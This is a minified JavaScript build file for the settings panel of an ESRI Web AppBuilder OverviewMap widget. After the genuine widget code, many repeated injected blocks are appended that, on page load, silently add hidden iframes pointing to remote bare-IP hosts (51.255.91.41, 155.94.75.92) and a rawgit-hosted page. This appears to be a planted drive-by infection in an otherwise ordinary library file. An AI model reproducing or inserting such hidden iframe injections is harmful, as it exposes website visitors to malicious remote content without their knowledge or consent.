// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/OverviewMap/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/OverviewMap/setting/Setting.html":'\x3cdiv style\x3d"width:100%;height:100%;"\x3e\r\n  \x3cdiv class\x3d"corner-section"\x3e\r\n    \x3cspan class\x3d"corner-text"\x3e${nls.attachText}\x3c/span\x3e\r\n    \x3cdiv class\x3d"overview-items"\x3e\r\n      \x3cdiv class\x3d"overview-item jimu-float-leading jimu-leading-margin2" data-dojo-attach-point\x3d"topLeftNode"\x3e\r\n        \x3cdiv class\x3d"overview-top-left overview-item-image"\x3e\x3c/div\x3e\r\n        \x3cdiv data-dojo-type\x3d"jimu/dijit/RadioBtn" data-dojo-props\x3d"group:\'overview\'"\x3e\x3c/div\x3e\r\n        \x3clabel\x3e${nls.topLeft}\x3c/label\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"overview-item jimu-float-leading jimu-leading-margin2" data-dojo-attach-point\x3d"topRightNode"\x3e\r\n        \x3cdiv class\x3d"overview-top-right overview-item-image"\x3e\x3c/div\x3e\r\n        \x3cdiv data-dojo-type\x3d"jimu/dijit/RadioBtn" data-dojo-props\x3d"group:\'overview\'"\x3e\x3c/div\x3e\r\n        \x3clabel\x3e${nls.topRight}\x3c/label\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"overview-item jimu-float-leading jimu-leading-margin2" data-dojo-attach-point\x3d"bottomLeftNode"\x3e\r\n        \x3cdiv class\x3d"overview-bottom-left overview-item-image"\x3e\x3c/div\x3e\r\n        \x3cdiv data-dojo-type\x3d"jimu/dijit/RadioBtn" data-dojo-props\x3d"group:\'overview\'"\x3e\x3c/div\x3e\r\n        \x3clabel\x3e${nls.bottomLeft}\x3c/label\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"overview-item jimu-float-leading jimu-leading-margin2" data-dojo-attach-point\x3d"bottomRightNode"\x3e\r\n        \x3cdiv class\x3d"overview-bottom-right overview-item-image"\x3e\x3c/div\x3e\r\n        \x3cdiv data-dojo-type\x3d"jimu/dijit/RadioBtn" data-dojo-props\x3d"group:\'overview\'"\x3e\x3c/div\x3e\r\n        \x3clabel\x3e${nls.bottomRight}\x3c/label\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"check" data-dojo-attach-point\x3d"expandBox"\x3e\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/OverviewMap/setting/css/style.css":".jimu-widget-overviewmap-setting{margin:0; padding:0; font-size:14px; color: #596679;}.jimu-widget-overviewmap-setting .corner-section .overview-items{margin-top: 15px; margin-bottom: 30px; overflow: hidden; font-size: 10px;}.jimu-widget-overviewmap-setting .corner-section .overview-item {text-align: center; color: #596679;}.jimu-widget-overviewmap-setting .corner-section .overview-item label {font-size: 14px; vertical-align: middle;}.jimu-widget-overviewmap-setting .corner-section .overview-item:first-child{margin-left: 0;}.jimu-rtl .overview-item:first-child {margin-left: 2em; margin-right: 0;}.jimu-widget-overviewmap-setting .corner-section .jimu-leading-margin2{margin-left: 1em;}.jimu-rtl .jimu-widget-overviewmap-setting .corner-section .jimu-leading-margin2{margin-left: 0; margin-right: 1em;}.jimu-widget-overviewmap-setting .corner-section .overview-item-image{position: relative; width: 226px; height: 150px; margin-bottom: 10px;}.jimu-widget-overviewmap-setting .jimu-radio {width: 14px; height: 14px; vertical-align: middle;}.jimu-widget-overviewmap-setting .jimu-radio-inner{width: 8px; height: 8px;}.jimu-widget-overviewmap-setting .overview-item .overview-top-left{background: url(images/topleft.png);}.jimu-widget-overviewmap-setting .overview-item .overview-top-right{background: url(images/topright.png);}.jimu-widget-overviewmap-setting .overview-item .overview-bottom-left{background: url(images/bottomleft.png);}.jimu-widget-overviewmap-setting .overview-item .overview-bottom-right{background: url(images/bottomright.png);}",
"*now":function(e){e(['dojo/i18n!*preload*widgets/OverviewMap/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dijit/registry dojo/_base/lang dojo/on dojo/query jimu/dijit/CheckBox jimu/dijit/RadioBtn".split(" "),function(e,f,g,h,c,d,k,l){return e([f,g],{baseClass:"jimu-widget-overviewmap-setting",_selectedAttachTo:"",postCreate:function(){this.expandBox=new l({label:this.nls.expandText,checked:!1},this.expandBox);this.expandBox.startup();this.own(d(this.topLeftNode,"click",c.hitch(this,function(){this._selectItem("top-left")})));
this.own(d(this.topRightNode,"click",c.hitch(this,function(){this._selectItem("top-right")})));this.own(d(this.bottomLeftNode,"click",c.hitch(this,function(){this._selectItem("bottom-left")})));this.own(d(this.bottomRightNode,"click",c.hitch(this,function(){this._selectItem("bottom-right")})))},startup:function(){this.inherited(arguments);this.config.overviewMap||(this.config.overviewMap={});this.setConfig(this.config)},setConfig:function(a){this.config=a;this.expandBox.setValue(a.overviewMap.visible);
this.config.overviewMap.attachTo?this._selectItem(this.config.overviewMap.attachTo):(a="",this.position?void 0!==this.position.top&&void 0!==this.position.left?a=window.isRTL?"top-right":"top-left":void 0!==this.position.top&&void 0!==this.position.right?a=window.isRTL?"top-left":"top-right":void 0!==this.position.bottom&&void 0!==this.position.left?a=window.isRTL?"bottom-right":"bottom-left":void 0!==this.position.bottom&&void 0!==this.position.right&&(a=window.isRTL?"bottom-left":"bottom-right"):
a=window.isRTL?"top-left":"top-right",this._selectItem(a))},_selectItem:function(a){var b=null;"top-left"===a?b=this.topLeftNode:"top-right"===a?b=this.topRightNode:"bottom-left"===a?b=this.bottomLeftNode:"bottom-right"===a&&(b=this.bottomRightNode);h.byNode(k(".jimu-radio",b)[0]).check(!0);this._selectedAttachTo=a},_getSelectedAttachTo:function(){return this._selectedAttachTo},getConfig:function(){this.config.overviewMap.visible=this.expandBox.checked;this.config.overviewMap.attachTo=this._getSelectedAttachTo();
this.config.overviewMap.maximizeButton="maximizeButton"in this.config.overviewMap?this.config.overviewMap.maximizeButton:!0;return this.config}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});